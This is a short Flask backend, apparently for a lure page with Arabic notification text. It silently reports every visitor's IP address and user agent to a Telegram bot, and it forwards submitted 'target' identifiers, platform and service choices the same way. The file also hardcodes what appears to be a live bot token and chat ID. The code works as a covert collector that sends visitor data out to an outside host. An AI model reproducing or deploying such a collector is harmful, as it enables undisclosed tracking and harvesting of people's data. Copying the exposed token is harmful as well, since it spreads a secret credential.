from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg"
CHAT_ID = "5811700860"

def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})

@app.route('/api/index', methods=['GET', 'POST'])
def handler():
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown Device')
    
    if request.method == 'GET':
        # إشعار دخول الموقع
        msg = f"🔔 **زائر جديد لموقعك!**\n\n🌐 IP: `{user_ip}`\n📱 الجهاز: `{user_agent}`"
        send_to_telegram(msg)
        return "ok"
    
    else:
        # إرسال البيانات المكتوبة
        data = request.json
        msg = f"🎯 **بيانات جديدة مستلمة!**\n\n" \
              f"🔹 القسم: {data.get('mode')}\n" \
              f"🔹 المنصة: {data.get('platform')}\n" \
              f"🔹 الخدمة: {data.get('service')}\n" \
              f"🌐 IP: `{user_ip}`\n" \
              f"📱 الجهاز: `{user_agent}`\n" \
              f"🔑 الهدف: `{data.get('id')}`\n" \
              f"🔢 العدد: `{data.get('count')}`"
        send_to_telegram(msg)
        return jsonify({"status": "ok"})
